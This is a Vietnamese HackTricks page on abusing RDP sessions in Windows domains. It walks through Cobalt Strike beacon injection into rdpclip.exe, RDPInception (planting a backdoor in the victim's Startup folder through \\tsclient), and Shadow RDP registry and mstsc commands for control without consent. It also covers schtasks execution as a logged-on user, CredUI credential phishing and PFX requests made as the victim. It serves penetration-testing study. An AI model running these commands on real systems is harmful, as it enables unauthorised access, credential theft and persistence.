# Lạm dụng phiên RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Nếu **nhóm bên ngoài** có **quyền truy cập RDP** vào một **máy tính** trong domain hiện tại, kẻ tấn công xâm nhập được máy tính đó có thể chờ một thành viên của nhóm kết nối.

Khi người dùng kết nối qua RDP, **kẻ tấn công có thể pivot sang phiên của người dùng đó** và lạm dụng quyền của người dùng trong domain bên ngoài.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Kiểm tra **các cách khác để đánh cắp session bằng những công cụ khác** [**trên trang này.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Chuyển tiếp xác thực giữa các session

Một **session console hoặc RDP đang hoạt động** thuộc về người dùng domain khác cũng là một đầu mối khi bạn có shell với ít quyền hơn trên cùng host. Cross-session activation qua DCOM có thể khiến một COM server phù hợp trong session tương tác đó thực hiện xác thực, và các công cụ như RemotePotato0 hoặc KrbRelay có thể thu thập hoặc chuyển tiếp quá trình xác thực này. Người dùng đã đăng nhập không nhất thiết phải là domain administrator: một quyền thư mục được giới hạn trong phạm vi hẹp, chẳng hạn quyền đọc mật khẩu được quản lý của gMSA, có thể đủ để pivot tiếp.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Bắt đầu bằng session ID và danh tính từ `query user`, `qwinsta`, hoặc danh sách session hiện có trong winPEAS. Hãy xem chúng là **các ứng viên**, không phải bằng chứng cho thấy có thể chuyển tiếp xác thực. COM class, các mức impersonation và authentication, khả năng truy cập session, định tuyến firewall/OXID, các cơ chế bảo vệ của protocol đích, và quyền hiệu lực của principal đã đăng nhập đều rất quan trọng. KrbRelay ghi lại các ví dụ cross-session LDAP, HTTP, SMB và NTLM, nhưng các đường đi này phụ thuộc vào phiên bản và cấu hình. LDAP channel binding cũng là một rào cản chuyển tiếp ở phía đích. Cụ thể, dự án RemotePotato0 lưu ý rằng kịch bản exploit RPC-to-LDAP ban đầu của họ đã được khắc phục vào năm 2022; đừng suy luận rằng có thể chuyển tiếp LDAP chỉ vì nhìn thấy một session.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Nếu người dùng truy cập vào một máy **qua RDP**, nơi **attacker** đang **chờ** họ, attacker sẽ có thể **inject beacon vào session RDP của người dùng**; nếu **victim đã mount ổ đĩa** khi truy cập qua RDP, **attacker có thể truy cập ổ đĩa đó**.

Trong trường hợp này, bạn có thể **compromise** **máy tính ban đầu** của **victim** bằng cách ghi một **backdoor** vào **thư mục statup**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Nếu bạn là **local admin** trên host nơi nạn nhân đã có **active RDP session**, bạn có thể **xem/điều khiển desktop đó mà không cần đánh cắp password hoặc dump LSASS**.<sup>[[1]](#references)</sup>

Điều này phụ thuộc vào policy **Remote Desktop Services shadowing** được lưu tại:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Các giá trị đáng chú ý:

- `0`: Đã tắt
- `1`: `EnableInputNotify` (điều khiển, cần người dùng phê duyệt)
- `2`: `EnableInputNoNotify` (điều khiển, **không cần người dùng phê duyệt**)
- `3`: `EnableNoInputNotify` (chỉ xem, cần người dùng phê duyệt)
- `4`: `EnableNoInputNoNotify` (chỉ xem, **không cần người dùng phê duyệt**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Điều này đặc biệt hữu ích khi một người dùng có đặc quyền kết nối qua RDP để lại màn hình nền chưa khóa, phiên KeePass, console MMC, phiên trình duyệt hoặc admin shell đang mở.

## Scheduled Tasks As Logged-On User

Nếu bạn là **local admin** và người dùng mục tiêu **hiện đang đăng nhập**, Task Scheduler có thể khởi chạy code **dưới danh nghĩa người dùng đó mà không cần mật khẩu của họ**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Điều này biến phiên đăng nhập hiện có của nạn nhân thành một primitive thực thi:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Ghi chú:

- Nếu người dùng **chưa đăng nhập**, Windows thường yêu cầu mật khẩu để tạo tác vụ chạy dưới danh nghĩa người dùng đó.
- Nếu người dùng **đã đăng nhập**, tác vụ có thể dùng lại ngữ cảnh đăng nhập hiện có.
- Đây là cách thực tế để thực thi các thao tác GUI hoặc khởi chạy binary trong phiên của nạn nhân mà không cần đụng đến LSASS.

## Lạm dụng CredUI Prompt từ phiên của nạn nhân

Khi có thể thực thi **bên trong desktop tương tác của nạn nhân** (ví dụ qua **Shadow RDP** hoặc **tác vụ đã lên lịch chạy dưới danh nghĩa người dùng đó**), bạn có thể hiển thị **lời nhắc thông tin xác thực Windows thật** bằng các API CredUI và thu thập thông tin xác thực do nạn nhân nhập.<sup>[[1]](#references)</sup>

Các API liên quan:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Quy trình thường dùng:

1. Khởi chạy một binary trong phiên của nạn nhân.
2. Hiển thị lời nhắc xác thực domain có giao diện phù hợp với thương hiệu domain hiện tại.
3. Giải nén bộ đệm xác thực được trả về.
4. Xác thực thông tin xác thực được cung cấp và tùy chọn tiếp tục hiển thị lời nhắc cho đến khi nhập thông tin xác thực hợp lệ.

Cách này hữu ích cho **phishing ngay trên host** vì lời nhắc được hiển thị bởi các API Windows tiêu chuẩn thay vì một biểu mẫu HTML giả.

## Yêu cầu PFX trong ngữ cảnh của nạn nhân

Cũng có thể dùng primitive **tác vụ đã lên lịch chạy dưới danh nghĩa người dùng** để yêu cầu **certificate/PFX với tư cách nạn nhân đang đăng nhập**. Sau đó, certificate đó có thể được dùng để **xác thực AD** với tư cách người dùng đó, hoàn toàn không cần đánh cắp mật khẩu.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Quy trình cấp cao:

1. Có được **quyền quản trị cục bộ** trên host nơi nạn nhân đang đăng nhập.
2. Chạy logic enrollment/export dưới danh nghĩa nạn nhân bằng **tác vụ đã lên lịch**.
3. Export **PFX** thu được.
4. Dùng PFX để xác thực AD dựa trên PKINIT / certificate.

Xem các trang AD CS để tìm hiểu các cách lạm dụng tiếp theo:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Từ mạng phẳng đến domain bị khóa chặt bằng mô hình phân tầng](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – Tùy chọn shadow-session của `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR plugin Shadow RDP #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - module schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR yêu cầu PFX thông qua tác vụ đã lên lịch #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - kích hoạt DCOM giữa các phiên và những hạn chế hiện tại](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - ví dụ relay giữa các phiên và yêu cầu CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - lệnh query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - thuộc tính ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding và bảo vệ chống relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
